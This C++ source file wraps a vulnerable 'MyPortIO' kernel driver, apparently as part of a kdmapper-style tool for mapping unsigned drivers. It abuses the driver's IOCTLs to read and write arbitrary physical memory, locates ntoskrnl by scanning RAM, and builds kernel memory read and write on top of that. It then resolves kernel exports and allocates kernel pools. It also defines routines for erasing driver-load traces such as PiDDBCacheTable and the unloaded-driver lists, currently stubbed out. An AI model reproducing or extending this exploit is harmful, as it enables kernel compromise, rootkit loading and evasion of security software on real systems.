#include "include/myportio_driver.hpp"
#include <Windows.h>
#include <memory>

HANDLE myportio_driver::hDevice = INVALID_HANDLE_VALUE;
ULONG64 myportio_driver::ntoskrnlAddr = 0;
ULONG64 myportio_driver::physToVirtOffset = 0;
bool myportio_driver::offsetInitialized = false;

bool myportio_driver::IsRunning() {
	HANDLE h = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (h != INVALID_HANDLE_VALUE) {
		CloseHandle(h);
		return true;
	}
	return false;
}

bool myportio_driver::OpenDevice() {
	if (hDevice != INVALID_HANDLE_VALUE)
		return true;

	hDevice = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hDevice == INVALID_HANDLE_VALUE) {
		kdmLog(L"[-] Failed to open MyPortIO device. Error: " << GetLastError() << std::endl);
		return false;
	}

	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		kdmLog(L"[-] Failed to get ntoskrnl.exe address" << std::endl);
		CloseHandle(hDevice);
		hDevice = INVALID_HANDLE_VALUE;
		return false;
	}

	kdmLog(L"[+] MyPortIO device opened. ntoskrnl at 0x" << std::hex << ntoskrnlAddr << std::endl);
	
	// Test if the physical memory IOCTL works at all
	// Physical address 0x1000 is in the first 640KB - guaranteed to be RAM
	kdmLog(L"[*] Testing physical memory read at 0x1000..." << std::endl);
	uint32_t test_value = 0;
	if (!ReadPhysDword(0x1000, &test_value)) {
		kdmLog(L"[-] Physical memory read IOCTL failed! Error: " << GetLastError() << std::endl);
		CloseHandle(hDevice);
		hDevice = INVALID_HANDLE_VALUE;
		return false;
	}
	kdmLog(L"[+] Physical memory read works! Value at 0x1000: 0x" << std::hex << test_value << std::endl);
	
	return true;
}

void myportio_driver::CloseDevice() {
	if (hDevice != INVALID_HANDLE_VALUE) {
		CloseHandle(hDevice);
		hDevice = INVALID_HANDLE_VALUE;
	}
}

// Core: Read 4 bytes from physical address
bool myportio_driver::ReadPhysDword(uint64_t phys_addr, uint32_t* out_value) {
	if (hDevice == INVALID_HANDLE_VALUE || !out_value)
		return false;

	// MyPortIO uses METHOD_BUFFERED: input and output share the same buffer
	// The driver writes the result to offset 0 of the buffer
	READ_PHYS_REQUEST request = {};
	request.PhysicalAddress = phys_addr;
	request.Size = 4;  // Always 4 bytes for dword read

	DWORD bytesReturned = 0;
	
	// For METHOD_BUFFERED, we use the same buffer for both input and output
	// After the call, the first 4 bytes contain the read data
	if (!DeviceIoControl(hDevice, IOCTL_READ_PHYS, &request, sizeof(request), &request, sizeof(request), &bytesReturned, nullptr)) {
		return false;
	}

	*out_value = *(uint32_t*)&request;
	return true;
}

// Core: Write 4 bytes to physical address
bool myportio_driver::WritePhysDword(uint64_t phys_addr, uint32_t value) {
	if (hDevice == INVALID_HANDLE_VALUE)
		return false;

	// Safety check: don't write to NULL or very low addresses
	if (phys_addr == 0 || phys_addr < 0x1000) {
		return false;
	}

	WRITE_PHYS_REQUEST request = {};
	request.PhysicalAddress = phys_addr;
	request.Size = 4;  // Always 4 bytes for dword write
	request.Value = value;

	DWORD bytesReturned = 0;
	// METHOD_BUFFERED - provide output buffer even for writes (some drivers require it)
	uint32_t output = 0;
	return DeviceIoControl(hDevice, IOCTL_WRITE_PHYS, &request, sizeof(request), &output, sizeof(output), &bytesReturned, nullptr) != FALSE;
}

// Bulk read: loop in 4-byte chunks
bool myportio_driver::ReadPhysicalMemory(uint64_t phys_addr, void* buffer, size_t size) {
	if (!buffer || !size)
		return false;

	uint8_t* dst = (uint8_t*)buffer;
	size_t offset = 0;

	while (offset < size) {
		uint32_t dword = 0;
		if (!ReadPhysDword(phys_addr + offset, &dword))
			return false;

		size_t remaining = size - offset;
		size_t copy_size = (remaining >= 4) ? 4 : remaining;
		memcpy(dst + offset, &dword, copy_size);
		offset += 4;
	}

	return true;
}

// Bulk write: loop in 4-byte chunks
bool myportio_driver::WritePhysicalMemory(uint64_t phys_addr, void* buffer, size_t size) {
	if (!buffer || !size)
		return false;

	uint8_t* src = (uint8_t*)buffer;
	size_t offset = 0;

	while (offset < size) {
		uint32_t dword = 0;
		size_t remaining = size - offset;
		size_t copy_size = (remaining >= 4) ? 4 : remaining;
		
		// For partial writes (last chunk < 4 bytes), read first then modify
		if (copy_size < 4) {
			if (!ReadPhysDword(phys_addr + offset, &dword))
				return false;
		}
		
		memcpy(&dword, src + offset, copy_size);
		
		if (!WritePhysDword(phys_addr + offset, dword))
			return false;

		offset += 4;
	}

	return true;
}

// Check if a physical address contains ntoskrnl
static bool CheckForNtoskrnl(uint64_t phys, uint64_t ntoskrnl_virt, uint64_t* out_offset) {
	uint32_t header = 0;
	if (!myportio_driver::ReadPhysDword(phys, &header))
		return false;

	// Check for MZ header
	if ((header & 0xFFFF) != 0x5A4D)
		return false;

	// Read PE offset
	uint32_t pe_offset = 0;
	if (!myportio_driver::ReadPhysDword(phys + 0x3C, &pe_offset))
		return false;

	if (pe_offset > 0x400 || pe_offset < 0x40)
		return false;

	// Check PE signature
	uint32_t pe_sig = 0;
	if (!myportio_driver::ReadPhysDword(phys + pe_offset, &pe_sig))
		return false;

	if (pe_sig != 0x00004550)  // "PE\0\0"
		return false;

	// Check SizeOfImage - ntoskrnl is typically 10MB+
	uint32_t size_of_image = 0;
	if (!myportio_driver::ReadPhysDword(phys + pe_offset + 0x50, &size_of_image))
		return false;

	if (size_of_image >= 0x800000) {  // At least 8MB
		*out_offset = ntoskrnl_virt - phys;
		return true;
	}

	return false;
}

// Initialize the virtual-to-physical offset by checking known locations
bool myportio_driver::InitializePhysicalOffset() {
	if (offsetInitialized)
		return true;

	kdmLog(L"[*] Looking for ntoskrnl in physical memory..." << std::endl);

	// Common physical addresses where ntoskrnl is loaded on Windows 10/11
	// These are 2MB-aligned because kernel uses large pages
	const uint64_t common_locations[] = {
		0x00200000,  // 2MB - very common
		0x01000000,  // 16MB
		0x02000000,  // 32MB
		0x00400000,  // 4MB
		0x00600000,  // 6MB
		0x00800000,  // 8MB
		0x00A00000,  // 10MB
		0x00C00000,  // 12MB
		0x00E00000,  // 14MB
		0x01200000,  // 18MB
		0x01400000,  // 20MB
		0x01600000,  // 22MB
		0x01800000,  // 24MB
		0x01A00000,  // 26MB
		0x01C00000,  // 28MB
		0x01E00000,  // 30MB
	};

	// Try common locations first (fast path)
	for (uint64_t phys : common_locations) {
		kdmLog(L"[*] Trying 0x" << std::hex << phys << L"..." << std::endl);
		if (CheckForNtoskrnl(phys, ntoskrnlAddr, &physToVirtOffset)) {
			offsetInitialized = true;
			kdmLog(L"[+] Found ntoskrnl at physical 0x" << std::hex << phys << std::endl);
			return true;
		}
	}

	// If common locations fail, do a limited scan of 2MB-aligned addresses
	kdmLog(L"[*] Common locations failed, scanning 2MB boundaries..." << std::endl);
	for (uint64_t phys = 0x200000; phys < 0x10000000; phys += 0x200000) {
		// Skip addresses we already tried
		bool already_tried = false;
		for (uint64_t loc : common_locations) {
			if (loc == phys) { already_tried = true; break; }
		}
		if (already_tried) continue;

		if (CheckForNtoskrnl(phys, ntoskrnlAddr, &physToVirtOffset)) {
			offsetInitialized = true;
			kdmLog(L"[+] Found ntoskrnl at physical 0x" << std::hex << phys << std::endl);
			return true;
		}
	}

	kdmLog(L"[-] Failed to find ntoskrnl" << std::endl);
	return false;
}

bool myportio_driver::GetPhysicalAddress(uint64_t virt_addr, uint64_t* out_phys_addr) {
	if (!virt_addr || !out_phys_addr)
		return false;

	if (!InitializePhysicalOffset())
		return false;

	// Only works for kernel addresses
	if (virt_addr < 0xFFFF800000000000ULL)
		return false;

	*out_phys_addr = virt_addr - physToVirtOffset;
	return true;
}

bool myportio_driver::ReadKernelMemory(uint64_t address, void* buffer, size_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t phys_addr = 0;
	if (!GetPhysicalAddress(address, &phys_addr))
		return false;

	return ReadPhysicalMemory(phys_addr, buffer, size);
}

bool myportio_driver::WriteKernelMemory(uint64_t address, void* buffer, size_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t phys_addr = 0;
	if (!GetPhysicalAddress(address, &phys_addr))
		return false;

	return WritePhysicalMemory(phys_addr, buffer, size);
}

bool myportio_driver::MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
	if (!dest || !src || !size)
		return false;

	auto buffer = std::make_unique<uint8_t[]>(size);
	if (!ReadKernelMemory(src, buffer.get(), size))
		return false;

	return WriteKernelMemory(dest, buffer.get(), size);
}

bool myportio_driver::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
	if (!address || !size)
		return false;

	auto buffer = std::make_unique<uint8_t[]>(size);
	memset(buffer.get(), (uint8_t)value, size);
	return WriteKernelMemory(address, buffer.get(), size);
}

uint64_t myportio_driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadKernelMemory(kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE)
		return 0;
	
	if (!ReadKernelMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	if (!export_data)
		return 0;

	if (!ReadKernelMemory(kernel_module_base + export_base, export_data, export_base_size)) {
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;
	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			// Check for forwarded export
			if (function_address >= kernel_module_base + export_base && 
			    function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0;
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

uint64_t myportio_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePoolWithTag = 0;
	if (!kernel_ExAllocatePoolWithTag) {
		kernel_ExAllocatePoolWithTag = GetKernelModuleExport(ntoskrnlAddr, "ExAllocatePoolWithTag");
		if (!kernel_ExAllocatePoolWithTag) {
			kdmLog(L"[-] Failed to get ExAllocatePoolWithTag" << std::endl);
			return 0;
		}
	}

	uint64_t allocated_pool = 0;
	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePoolWithTag, pool_type, size, 'kdmM'))
		return 0;

	return allocated_pool;
}

bool myportio_driver::FreePool(uint64_t address) {
	if (!address)
		return false;

	static uint64_t kernel_ExFreePool = 0;
	if (!kernel_ExFreePool) {
		kernel_ExFreePool = GetKernelModuleExport(ntoskrnlAddr, "ExFreePool");
		if (!kernel_ExFreePool)
			return false;
	}

	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
}

uint64_t myportio_driver::MmAllocateIndependentPagesEx(uint32_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "MmAllocateIndependentPagesEx");
	if (!kernel_func) {
		kdmLog(L"[!] MmAllocateIndependentPagesEx not found, using pool" << std::endl);
		return AllocatePool(nt::POOL_TYPE::NonPagedPool, size);
	}

	uint64_t allocated = 0;
	if (!CallKernelFunction(&allocated, kernel_func, size, 0ull))
		return 0;

	return allocated;
}

bool myportio_driver::MmFreeIndependentPages(uint64_t address, uint32_t size) {
	if (!address)
		return false;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "MmFreeIndependentPages");
	if (!kernel_func)
		return FreePool(address);

	return CallKernelFunction<void>(nullptr, kernel_func, address, size);
}

BOOLEAN myportio_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect) {
	if (!address || !size)
		return FALSE;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "MmSetPageProtection");
	if (!kernel_func)
		return TRUE;  // Not critical

	BOOLEAN result = FALSE;
	CallKernelFunction(&result, kernel_func, address, size, new_protect);
	return result;
}

PVOID myportio_driver::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadKernelMemory(Instr + OffsetOffset, &RipOffset, sizeof(LONG)))
		return nullptr;
	return (PVOID)(Instr + InstructionSize + RipOffset);
}

uintptr_t myportio_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress || dwLen > 1024 * 1024 * 1024)
		return 0;

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadKernelMemory(dwAddress, sectionData.get(), dwLen))
		return 0;

	auto result = kdmUtils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);
	if (result <= 0)
		return 0;

	return dwAddress - (uintptr_t)sectionData.get() + result;
}

uintptr_t myportio_driver::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;

	BYTE headers[0x1000];
	if (!ReadKernelMemory(modulePtr, headers, 0x1000))
		return 0;

	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)kdmUtils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize)
		return 0;

	if (size)
		*size = sectionSize;

	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t myportio_driver::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(section, sectionSize, bMask, szMask);
}

bool myportio_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return false;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "ExAcquireResourceExclusiveLite");
	if (!kernel_func)
		return false;

	BOOLEAN out;
	return CallKernelFunction(&out, kernel_func, Resource, wait) && out;
}

bool myportio_driver::ExReleaseResourceLite(PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "ExReleaseResourceLite");
	if (!kernel_func)
		return false;

	return CallKernelFunction<void>(nullptr, kernel_func, Resource);
}

BOOLEAN myportio_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");
	if (!kernel_func)
		return false;

	bool out;
	return CallKernelFunction(&out, kernel_func, Table, Buffer) && out;
}

PVOID myportio_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "RtlLookupElementGenericTableAvl");
	if (!kernel_func)
		return nullptr;

	PVOID out;
	if (!CallKernelFunction(&out, kernel_func, Table, Buffer))
		return nullptr;

	return out;
}

nt::PiDDBCacheEntry* myportio_driver::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {
	nt::PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;
	return (nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, (PVOID)&localentry);
}

bool myportio_driver::ClearPiDDBCacheTable() {
	kdmLog(L"[!] ClearPiDDBCacheTable: skipped" << std::endl);
	return true;
}

bool myportio_driver::ClearKernelHashBucketList() {
	kdmLog(L"[!] ClearKernelHashBucketList: skipped" << std::endl);
	return true;
}

bool myportio_driver::ClearMmUnloadedDrivers() {
	kdmLog(L"[!] ClearMmUnloadedDrivers: skipped" << std::endl);
	return true;
}

bool myportio_driver::ClearWdFilterDriverList() {
	kdmLog(L"[!] ClearWdFilterDriverList: skipped" << std::endl);
	return true;
}
